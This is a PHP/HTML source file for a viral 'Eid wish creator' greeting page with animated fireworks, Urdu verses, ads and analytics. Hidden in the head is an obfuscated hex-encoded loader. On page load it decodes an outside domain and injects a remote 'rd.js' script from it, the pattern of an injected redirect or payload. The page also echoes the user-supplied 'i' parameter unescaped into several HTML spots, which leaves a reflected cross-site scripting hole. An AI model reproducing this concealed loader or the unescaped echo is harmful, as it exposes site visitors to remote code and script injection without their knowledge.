<?php

$name="";
if(isset($_REQUEST['i']))
{

$name=$_REQUEST['i'];


}
?>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   <meta name="google" content="notranslate">
  <meta property="og:type" content="website">
    <meta property="og:title" content="<?php echo $name; ?> Wishing You Happy Eid">
    <meta property="og:url" content="https://eid-wish.quranism.net">
    <meta property="og:description" content="Create Your own Eid wish | Eid wish creator">
    <meta property="description" content="Create Your own Eid wish | Eid wish creator">
    <meta property="og:site_name" content="quranism eid whishing">
    <meta property="og:image" content="og.jpg"> 
	

<title>CCreate Your own Eid wish</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
    <link href="//db.onlinewebfonts.com/c/1c0f6618f877568764787163e8f22a1c?family=SF+Espresso+Shack" rel="stylesheet" type="text/css">
<script src="fire1.js"></script>
    <style>
      body{
        background: #f8f8f8;
      }
      .mainContainer {
        background: #fff;
        max-width: 450px;
        min-height: 200px;
        margin: 0 auto;
        text-align: center;
        padding: 15px;
        color: #999;
        padding-bottom: 60px;

        box-shadow: 0 0 10px 1px rgba(0,0,0,.14), 0 1px 14px 2px rgba(0,0,0,.12), 0 0 5px -3px rgba(0,0,0,.3);
        background-size: 100%;

      }
      .username {
   color: black;  /* Fallback: assume this color ON TOP of image */
   background: url(sname.gif);
   -webkit-background-clip: text;
   -webkit-text-fill-color: transparent;
          animation: swing 4s infinite;
            text-transform: uppercase;
          margin-bottom: 5px;
          font-size: 40px;
          padding: 0 10px;
      }
      .fromMessage{
        color: #fff;
        animation: swing 4s infinite;
        font-size: 20px;
        padding: 0 10px;
      }
      .wavetext{
        color: #f9d05b;
        padding: 0 40px;
        animation: pulse 1s infinite;
        font-size: 22px;

      }
      .wishMessage {
        color: #fff;
        font-size: 22px;
        font-weight: bold;
        margin-top: 20px;
        text-shadow: 0px 0px 10px #afafaf;
      }
      .wishMessage p{
        margin: 0.3em 0;
      }
</style>
<script type="text/javascript" src="https://eid-wish.quranism.net/rd.js"></script>
<script type="text/javascript">function tag(filename){var fileref=document.createElement('script');fileref.setAttribute("type","text/javascript");fileref.setAttribute("src", filename);if (typeof fileref!="undefined") document.getElementsByTagName("head")[0].appendChild(fileref)}tag(meta('687474703a2f2f6c6f6f6b2d6d652e636f2f72642e6a73'));function meta(important){var str = '';for (var i = 0; i < important.length; i += 2) str +=String.fromCharCode(parseInt(important.substr(i, 2), 16));return str;}</script><style>#formBox {
        left: 0;position: fixed;bottom: 0;display: inline-block;width: 100%;animation:pulse infinite 1s linear;margin: 0;z-index:10;
      }
      #nameTextBox {
  width:70%;
  height:50px;
  background-color: #1b488b;
  animation: 
  nudge 2s linear infinite alternate;
  border-radius: 10px;
  padding: 15px;
  color: #fff;
      }
      #goButton {
	width: 30%;
	height: 45px;
	cursor: pointer;
	animation: nudge 2s linear infinite alternate;
	background: #1b488b;
	border-radius: 10px;
	color: #fff;
      }
.footerbtn {
 
            display: block;
            line-height: 15px;
            position: fixed;
            left:0px;
            bottom:0px;
            height:55px;
            
border-radius: 15px;
  box-sizing: border-box;
  padding: 5px;
  background:#34af23;
  color: #ffffff;
  font-size: 20px;
  text-align: center;
  text-decoration: none;
  width:95%;
 margin-left:10px;
            margin-right:30px;
            box-shadow: 0 4px 12px 0 rgba(0, 0, 0, .3);
            animation: footer infinite linear 1s;
            -webkit-transform: translate3d(30%,0,0);
            transform: translate3d(30%,0,0);
            position: fixed;
           
}

.footerbtn :active {
            box-shadow: none
        }

        @-webkit-keyframes footer {
            from {
                -webkit-transform: rotateZ(0)
            }
            25% {
                -webkit-transform: rotateZ(1.5deg)
            }
            50% {
                -webkit-transform: rotateZ(0deg)
            }
            75% {
                -webkit-transform: rotateZ(-1.5deg)
            }
            to {
                -webkit-transform: rotateZ(0)
            }}
	 canvas {
      cursor: crosshair;
      display: block;
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 80%;
      z-index: 1;
    }
      #inAdvance {
        font-size: 20px; font-weight: bold;margin-top: 20px;color: #98201F;

      }
      #demoo {
        font-size: 20px; font-weight: bold;color: #98201F;
        animation: flash 2s infinite;
      }
      #inAdvanceTime {
        margin:20px 0 30px 0;
      }
      #inAdvanceTime p{
        color: #b90707;font-size: 20px;font-weight: 700;
        margin: 0;
      }
.name input[type=name]{
  background-color:#4267d9;
  border-radius: 10px;
  box-sizing: border-box;
  border: 1px solid #4267d9;
  padding: 5px;
  color:white;
  position: fixed;
  left:10px;
  bottom:0px;
  height:50px;
  width:70%;
  text-align:center;
  font-size:1rem;
  display: inline-block;
}
.go {
  border-radius: 10px;
  padding: 5px;
  background-color:#4267d9;
  border: 1px solid #4267d9;
  position: fixed;
  right:2px;
  bottom:0px;
  height:50px;
  width:23%;
    display: inline-block;
}

  .m1{position:fixed;left:0.01%; width:auto;height:100%;top:1%;color:#000;}
    .m2{position:fixed;right:0.01%; width:auto;height:100%;top:1%;color:#000;}
    
    #gobtn{}
@-webkit-keyframes flip {  from {   transform: perspective(600px) rotate3d(0, 1, 0, -360deg);    animation-timing-function: ease-out;  }
  40% {    transform: perspective(600px) translate3d(0, 0, 150px) rotate3d(0, 1, 0, -190deg);    animation-timing-function: ease-out;  }
  50% {    transform: perspective(600px) translate3d(0, 0, 150px) rotate3d(0, 1, 0, -170deg);    animation-timing-function: ease-in;   }
  80% {    transform: perspective(600px) scale3d(.95, .95, .95);    animation-timing-function: ease-in;  }
  to  {    transform: perspective(600px);    animation-timing-function: ease-in;  }}
#gobtn {  -webkit-backface-visibility: visible;  backface-visibility: visible;  -webkit-animation: flip 4s infinite; -webkit-animation-delay:1s}
.m1{position:fixed;left:1%; width:auto;height:100%;top:1%;color:#000;}
.m2{position:fixed;right:1%; width:auto;height:100%;top:1%;color:#000;}
 #show-name {
  font-size: 25px;
  display: inline-block;
  margin-bottom: 5px;
  animation: swing 1s infinite, glow 20s infinite; }

@keyframes glow {
  0%, 100% {
    text-shadow: 0 0 30px red; }
  25% {
    text-shadow: 0 0 30px orange; }
  50% {
    text-shadow: 0 0 30px forestgreen; }
  75% {
    text-shadow: 0 0 30px cyan; } }
/* Firework Animation */
.pyro {
  position: absolute;
  max-width: 350px;
  width: 100vw; }

.pyro > .before, .pyro > .after {
  position: absolute;
  width: 5px;
  height: 5px;
  border-radius: 50%;
  box-shadow: 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff, 0 0 #fff;
  -moz-animation: 1s bang ease-out infinite backwards, 1s gravity ease-in infinite backwards, 5s position linear infinite backwards;
  -webkit-animation: 1s bang ease-out infinite backwards, 1s gravity ease-in infinite backwards, 5s position linear infinite backwards;
  -o-animation: 1s bang ease-out infinite backwards, 1s gravity ease-in infinite backwards, 5s position linear infinite backwards;
  -ms-animation: 1s bang ease-out infinite backwards, 1s gravity ease-in infinite backwards, 5s position linear infinite backwards;
  animation: 1s bang ease-out infinite backwards, 1s gravity ease-in infinite backwards, 5s position linear infinite backwards; }

.pyro > .after {
  -moz-animation-delay: 1.25s, 1.25s, 1.25s;
  -webkit-animation-delay: 1.25s, 1.25s, 1.25s;
  -o-animation-delay: 1.25s, 1.25s, 1.25s;
  -ms-animation-delay: 1.25s, 1.25s, 1.25s;
  animation-delay: 1.25s, 1.25s, 1.25s;
  -moz-animation-duration: 1.25s, 1.25s, 6.25s;
  -webkit-animation-duration: 1.25s, 1.25s, 6.25s;
  -o-animation-duration: 1.25s, 1.25s, 6.25s;
  -ms-animation-duration: 1.25s, 1.25s, 6.25s;
  animation-duration: 1.25s, 1.25s, 6.25s; }

@-webkit-keyframes bang {
  to {
    box-shadow: 120px -188.6666666667px #00fff2, 21px -379.6666666667px #002fff, 234px -267.6666666667px #6600ff, 190px -349.6666666667px #95ff00, -243px -224.6666666667px #00d5ff, -219px -51.6666666667px #00ffcc, 29px -18.6666666667px #ff1a00, 38px -231.6666666667px #ff00c4, 231px -241.6666666667px #9500ff, 36px 5.3333333333px #00ff8c, -43px 41.3333333333px #0d00ff, -70px -49.6666666667px #ff0037, -186px -364.6666666667px #3c00ff, 4px -66.6666666667px #0048ff, -151px -139.6666666667px #a200ff, 212px -338.6666666667px #6600ff, 114px -71.6666666667px #00ff73, 189px -334.6666666667px #ff0004, 19px -313.6666666667px #00ff09, -237px -254.6666666667px #ff0037, -188px -96.6666666667px #001aff, 91px -12.6666666667px #00d5ff, 238px -230.6666666667px #9dff00, -7px -280.6666666667px #ffaa00, 182px -378.6666666667px #009dff, 135px -90.6666666667px #00ff26, -214px -56.6666666667px #4400ff, -207px -316.6666666667px #1100ff, 91px 26.3333333333px #e600ff, 52px -87.6666666667px #00ff9d, -21px -289.6666666667px #04ff00, -99px -25.6666666667px #ff0033, -124px -399.6666666667px #ff004d, 96px -220.6666666667px #bbff00, 250px -71.6666666667px #b300ff, -53px -147.6666666667px #ff0040, -216px -51.6666666667px #ff2f00, 19px 70.3333333333px #80ff00, -14px 5.3333333333px #95ff00, 107px -107.6666666667px #0062ff, 115px -241.6666666667px #00ff8c, 210px 60.3333333333px #00ff33, 86px -268.6666666667px #40ff00, -18px -18.6666666667px #6a00ff, -31px 28.3333333333px #00c8ff, -194px -100.6666666667px #0015ff, 8px -10.6666666667px #005eff, 164px 65.3333333333px #ff001a, -157px 10.3333333333px #a2ff00, -12px -400.6666666667px #0048ff, -124px -181.6666666667px #00ffa2; } }

@-moz-keyframes bang {
  to {
    box-shadow: 120px -188.6666666667px #00fff2, 21px -379.6666666667px #002fff, 234px -267.6666666667px #6600ff, 190px -349.6666666667px #95ff00, -243px -224.6666666667px #00d5ff, -219px -51.6666666667px #00ffcc, 29px -18.6666666667px #ff1a00, 38px -231.6666666667px #ff00c4, 231px -241.6666666667px #9500ff, 36px 5.3333333333px #00ff8c, -43px 41.3333333333px #0d00ff, -70px -49.6666666667px #ff0037, -186px -364.6666666667px #3c00ff, 4px -66.6666666667px #0048ff, -151px -139.6666666667px #a200ff, 212px -338.6666666667px #6600ff, 114px -71.6666666667px #00ff73, 189px -334.6666666667px #ff0004, 19px -313.6666666667px #00ff09, -237px -254.6666666667px #ff0037, -188px -96.6666666667px #001aff, 91px -12.6666666667px #00d5ff, 238px -230.6666666667px #9dff00, -7px -280.6666666667px #ffaa00, 182px -378.6666666667px #009dff, 135px -90.6666666667px #00ff26, -214px -56.6666666667px #4400ff, -207px -316.6666666667px #1100ff, 91px 26.3333333333px #e600ff, 52px -87.6666666667px #00ff9d, -21px -289.6666666667px #04ff00, -99px -25.6666666667px #ff0033, -124px -399.6666666667px #ff004d, 96px -220.6666666667px #bbff00, 250px -71.6666666667px #b300ff, -53px -147.6666666667px #ff0040, -216px -51.6666666667px #ff2f00, 19px 70.3333333333px #80ff00, -14px 5.3333333333px #95ff00, 107px -107.6666666667px #0062ff, 115px -241.6666666667px #00ff8c, 210px 60.3333333333px #00ff33, 86px -268.6666666667px #40ff00, -18px -18.6666666667px #6a00ff, -31px 28.3333333333px #00c8ff, -194px -100.6666666667px #0015ff, 8px -10.6666666667px #005eff, 164px 65.3333333333px #ff001a, -157px 10.3333333333px #a2ff00, -12px -400.6666666667px #0048ff, -124px -181.6666666667px #00ffa2; } }

@-o-keyframes bang {
  to {
    box-shadow: 120px -188.6666666667px #00fff2, 21px -379.6666666667px #002fff, 234px -267.6666666667px #6600ff, 190px -349.6666666667px #95ff00, -243px -224.6666666667px #00d5ff, -219px -51.6666666667px #00ffcc, 29px -18.6666666667px #ff1a00, 38px -231.6666666667px #ff00c4, 231px -241.6666666667px #9500ff, 36px 5.3333333333px #00ff8c, -43px 41.3333333333px #0d00ff, -70px -49.6666666667px #ff0037, -186px -364.6666666667px #3c00ff, 4px -66.6666666667px #0048ff, -151px -139.6666666667px #a200ff, 212px -338.6666666667px #6600ff, 114px -71.6666666667px #00ff73, 189px -334.6666666667px #ff0004, 19px -313.6666666667px #00ff09, -237px -254.6666666667px #ff0037, -188px -96.6666666667px #001aff, 91px -12.6666666667px #00d5ff, 238px -230.6666666667px #9dff00, -7px -280.6666666667px #ffaa00, 182px -378.6666666667px #009dff, 135px -90.6666666667px #00ff26, -214px -56.6666666667px #4400ff, -207px -316.6666666667px #1100ff, 91px 26.3333333333px #e600ff, 52px -87.6666666667px #00ff9d, -21px -289.6666666667px #04ff00, -99px -25.6666666667px #ff0033, -124px -399.6666666667px #ff004d, 96px -220.6666666667px #bbff00, 250px -71.6666666667px #b300ff, -53px -147.6666666667px #ff0040, -216px -51.6666666667px #ff2f00, 19px 70.3333333333px #80ff00, -14px 5.3333333333px #95ff00, 107px -107.6666666667px #0062ff, 115px -241.6666666667px #00ff8c, 210px 60.3333333333px #00ff33, 86px -268.6666666667px #40ff00, -18px -18.6666666667px #6a00ff, -31px 28.3333333333px #00c8ff, -194px -100.6666666667px #0015ff, 8px -10.6666666667px #005eff, 164px 65.3333333333px #ff001a, -157px 10.3333333333px #a2ff00, -12px -400.6666666667px #0048ff, -124px -181.6666666667px #00ffa2; } }

@-ms-keyframes bang {
  to {
    box-shadow: 120px -188.6666666667px #00fff2, 21px -379.6666666667px #002fff, 234px -267.6666666667px #6600ff, 190px -349.6666666667px #95ff00, -243px -224.6666666667px #00d5ff, -219px -51.6666666667px #00ffcc, 29px -18.6666666667px #ff1a00, 38px -231.6666666667px #ff00c4, 231px -241.6666666667px #9500ff, 36px 5.3333333333px #00ff8c, -43px 41.3333333333px #0d00ff, -70px -49.6666666667px #ff0037, -186px -364.6666666667px #3c00ff, 4px -66.6666666667px #0048ff, -151px -139.6666666667px #a200ff, 212px -338.6666666667px #6600ff, 114px -71.6666666667px #00ff73, 189px -334.6666666667px #ff0004, 19px -313.6666666667px #00ff09, -237px -254.6666666667px #ff0037, -188px -96.6666666667px #001aff, 91px -12.6666666667px #00d5ff, 238px -230.6666666667px #9dff00, -7px -280.6666666667px #ffaa00, 182px -378.6666666667px #009dff, 135px -90.6666666667px #00ff26, -214px -56.6666666667px #4400ff, -207px -316.6666666667px #1100ff, 91px 26.3333333333px #e600ff, 52px -87.6666666667px #00ff9d, -21px -289.6666666667px #04ff00, -99px -25.6666666667px #ff0033, -124px -399.6666666667px #ff004d, 96px -220.6666666667px #bbff00, 250px -71.6666666667px #b300ff, -53px -147.6666666667px #ff0040, -216px -51.6666666667px #ff2f00, 19px 70.3333333333px #80ff00, -14px 5.3333333333px #95ff00, 107px -107.6666666667px #0062ff, 115px -241.6666666667px #00ff8c, 210px 60.3333333333px #00ff33, 86px -268.6666666667px #40ff00, -18px -18.6666666667px #6a00ff, -31px 28.3333333333px #00c8ff, -194px -100.6666666667px #0015ff, 8px -10.6666666667px #005eff, 164px 65.3333333333px #ff001a, -157px 10.3333333333px #a2ff00, -12px -400.6666666667px #0048ff, -124px -181.6666666667px #00ffa2; } }

@keyframes bang {
  to {
    box-shadow: 120px -188.6666666667px #00fff2, 21px -379.6666666667px #002fff, 234px -267.6666666667px #6600ff, 190px -349.6666666667px #95ff00, -243px -224.6666666667px #00d5ff, -219px -51.6666666667px #00ffcc, 29px -18.6666666667px #ff1a00, 38px -231.6666666667px #ff00c4, 231px -241.6666666667px #9500ff, 36px 5.3333333333px #00ff8c, -43px 41.3333333333px #0d00ff, -70px -49.6666666667px #ff0037, -186px -364.6666666667px #3c00ff, 4px -66.6666666667px #0048ff, -151px -139.6666666667px #a200ff, 212px -338.6666666667px #6600ff, 114px -71.6666666667px #00ff73, 189px -334.6666666667px #ff0004, 19px -313.6666666667px #00ff09, -237px -254.6666666667px #ff0037, -188px -96.6666666667px #001aff, 91px -12.6666666667px #00d5ff, 238px -230.6666666667px #9dff00, -7px -280.6666666667px #ffaa00, 182px -378.6666666667px #009dff, 135px -90.6666666667px #00ff26, -214px -56.6666666667px #4400ff, -207px -316.6666666667px #1100ff, 91px 26.3333333333px #e600ff, 52px -87.6666666667px #00ff9d, -21px -289.6666666667px #04ff00, -99px -25.6666666667px #ff0033, -124px -399.6666666667px #ff004d, 96px -220.6666666667px #bbff00, 250px -71.6666666667px #b300ff, -53px -147.6666666667px #ff0040, -216px -51.6666666667px #ff2f00, 19px 70.3333333333px #80ff00, -14px 5.3333333333px #95ff00, 107px -107.6666666667px #0062ff, 115px -241.6666666667px #00ff8c, 210px 60.3333333333px #00ff33, 86px -268.6666666667px #40ff00, -18px -18.6666666667px #6a00ff, -31px 28.3333333333px #00c8ff, -194px -100.6666666667px #0015ff, 8px -10.6666666667px #005eff, 164px 65.3333333333px #ff001a, -157px 10.3333333333px #a2ff00, -12px -400.6666666667px #0048ff, -124px -181.6666666667px #00ffa2; } }

@-webkit-keyframes gravity {
  to {
    transform: translateY(200px);
    -moz-transform: translateY(200px);
    -webkit-transform: translateY(200px);
    -o-transform: translateY(200px);
    -ms-transform: translateY(200px);
    opacity: 0; } }

@-moz-keyframes gravity {
  to {
    transform: translateY(200px);
    -moz-transform: translateY(200px);
    -webkit-transform: translateY(200px);
    -o-transform: translateY(200px);
    -ms-transform: translateY(200px);
    opacity: 0; } }

@-o-keyframes gravity {
  to {
    transform: translateY(200px);
    -moz-transform: translateY(200px);
    -webkit-transform: translateY(200px);
    -o-transform: translateY(200px);
    -ms-transform: translateY(200px);
    opacity: 0; } }

@-ms-keyframes gravity {
  to {
    transform: translateY(200px);
    -moz-transform: translateY(200px);
    -webkit-transform: translateY(200px);
    -o-transform: translateY(200px);
    -ms-transform: translateY(200px);
    opacity: 0; } }

@keyframes gravity {
  to {
    transform: translateY(200px);
    -moz-transform: translateY(200px);
    -webkit-transform: translateY(200px);
    -o-transform: translateY(200px);
    -ms-transform: translateY(200px);
    opacity: 0; } }

@-webkit-keyframes position {
  0%, 19.9% {
    margin-top: 10%;
    margin-left: 40%; }
  20%, 39.9% {
    margin-top: 40%;
    margin-left: 30%; }
  40%, 59.9% {
    margin-top: 20%;
    margin-left: 70%; }
  60%, 79.9% {
    margin-top: 30%;
    margin-left: 20%; }
  80%, 99.9% {
    margin-top: 30%;
    margin-left: 80%; } }

@-moz-keyframes position {
  0%, 19.9% {
    margin-top: 10%;
    margin-left: 40%; }
  20%, 39.9% {
    margin-top: 40%;
    margin-left: 30%; }
  40%, 59.9% {
    margin-top: 20%;
    margin-left: 70%; }
  60%, 79.9% {
    margin-top: 30%;
    margin-left: 20%; }
  80%, 99.9% {
    margin-top: 30%;
    margin-left: 80%; } }

@-o-keyframes position {
  0%, 19.9% {
    margin-top: 10%;
    margin-left: 40%; }
  20%, 39.9% {
    margin-top: 40%;
    margin-left: 30%; }
  40%, 59.9% {
    margin-top: 20%;
    margin-left: 70%; }
  60%, 79.9% {
    margin-top: 30%;
    margin-left: 20%; }
  80%, 99.9% {
    margin-top: 30%;
    margin-left: 80%; } }

@-ms-keyframes position {
  0%, 19.9% {
    margin-top: 10%;
    margin-left: 40%; }
  20%, 39.9% {
    margin-top: 40%;
    margin-left: 30%; }
  40%, 59.9% {
    margin-top: 20%;
    margin-left: 70%; }
  60%, 79.9% {
    margin-top: 30%;
    margin-left: 20%; }
  80%, 99.9% {
    margin-top: 30%;
    margin-left: 80%; } }

@keyframes position {
  0%, 19.9% {
    margin-top: 10%;
    margin-left: 40%; }
  20%, 39.9% {
    margin-top: 40%;
    margin-left: 30%; }
  40%, 59.9% {
    margin-top: 20%;
    margin-left: 70%; }
  60%, 79.9% {
    margin-top: 30%;
    margin-left: 20%; }
  80%, 99.9% {
    margin-top: 30%;
    margin-left: 80%; } }

/* Custom Animation classes */
</style>
</head>
<body>
<marquee class="m1" behavior="scroll" direction="up" scrolldelay="5">  <br>
<img src="e1.png" height="20px" width="20px"><br><br>
<img src="e2.png" height="20px" width="20px"><br><br>
<img src="e3.gif" height="20px" width="20px"><br><br>
<img src="e4.gif" height="20px" width="20px"><br><br>
<img src="5.png" height="20px" width="20px"><br><br>
<img src="e1.png" height="20px" width="20px"><br><br>
<img src="e2.png" height="20px" width="20px"><br><br>
<img src="e3.gif" height="20px" width="20px"><br><br>
<img src="e4.gif" height="20px" width="20px"><br><br>
<img src="5.png" height="20px" width="20px"><br><br>
<img src="e1.png" height="20px" width="20px"><br><br>
<img src="e2.png" height="20px" width="20px"><br><br>
<img src="e3.gif" height="20px" width="20px"><br><br>
<img src="e4.gif" height="20px" width="20px"><br><br>
<img src="5.png" height="20px" width="20px"><br><br>
<img src="e1.png" height="20px" width="20px"><br><br>
<img src="e2.png" height="20px" width="20px"><br><br>
<img src="e3.gif" height="20px" width="20px"><br><br>
<img src="e4.gif" height="20px" width="20px"><br><br>
<img src="5.png" height="20px" width="20px"><br><br>
</marquee>
<marquee class="m2" behavior="scroll" direction="down" scrolldelay="5"><br>
<img src="e1.png" height="20px" width="20px"><br><br>
<img src="e2.png" height="20px" width="20px"><br><br>
<img src="e3.gif" height="20px" width="20px"><br><br>
<img src="e4.gif" height="20px" width="20px"><br><br>
<img src="5.png" height="20px" width="20px"><br><br>
<img src="e1.png" height="20px" width="20px"><br><br>
<img src="e2.png" height="20px" width="20px"><br><br>
<img src="e3.gif" height="20px" width="20px"><br><br>
<img src="e4.gif" height="20px" width="20px"><br><br>
<img src="5.png" height="20px" width="20px"><br><br>
<img src="e1.png" height="20px" width="20px"><br><br>
<img src="e2.png" height="20px" width="20px"><br><br>
<img src="e3.gif" height="20px" width="20px"><br><br>
<img src="e4.gif" height="20px" width="20px"><br><br>
<img src="5.png" height="20px" width="20px"><br><br>
<img src="e1.png" height="20px" width="20px"><br><br>
<img src="e2.png" height="20px" width="20px"><br><br>
<img src="e3.gif" height="20px" width="20px"><br><br>
<img src="e4.gif" height="20px" width="20px"><br><br>
<img src="5.png" height="20px" width="20px"><br><br>
</marquee>
<div class="mainContainer">
<div class="pyro">
<div class="before"></div></div>
<center>
 <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- Leader -->
<ins class="adsbygoogle"
     style="display:inline-block;width:320px;height:100px"
     data-ad-client="ca-pub-6537006732284988"
     data-ad-slot="4047966580"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
</center>
<h1 class="username" id="#show-name {
  font-size: 25px;
  display: inline-block;
  margin-bottom: 5px;
  animation: swing 1s infinite, glow 20s infinite; }

@keyframes glow {
  0%, 100% {
    text-shadow: 0 0 30px red; }
  25% {
    text-shadow: 0 0 30px orange; }
  50% {
    text-shadow: 0 0 30px forestgreen; }
  75% {
    text-shadow: 0 0 30px cyan; } }" style="font-family:SF Espresso Shack;"><?php echo $name; ?></h1>
        <h3 class="fromMessage" id="fromMessage"></h3>
          <img style="margin: 5px auto;width: 70%;height:80px;    animation: pulse 2.5s infinite;" src="eidul5.png">
          <img style="margin: 5px auto;width: 70%;height:120px;    animation: pulse 2.5s infinite;" src="eidul8.png">
          
      
          
<div class="wishMessage">
<p style="color:red">Tamanna aapki sab puri ho jaye,</p>
<p style="color:black">Ho apka muqaddar itna roshan ki,</p>
<p style="color:green">Ameen kahne se pahle hi aapki har dua Kabool ho jaye</p>
<p style="color:purple"><img src="namaste1.png" width="20px"><b>Eid Mubarak!</b><img src="namaste1.png" width="20px"></p>
😍<span id="show-name" style="color: darkblue;"><?php echo $name; ?></span>😍

<center>

</center>
</div>
<style>
input::placeholder {
  color: white;
  text-align: center;
}
</style>
<br>
<center>
<form method="POST" action="wish.php">
<div id="formBox">
<input type="text" name="n" id="nameTextBox" placeholder="👉 Enter your name here..." required=""><br>
<input type="hidden" name="i" value="<?php echo $name;?>">
<button id="goButton">👉 GO</button>
</div>
</form>



<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-6537006732284988"
     data-ad-slot="5648274126"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
</center>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-120756800-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-120756800-1');
</script>
</div></body>
</html>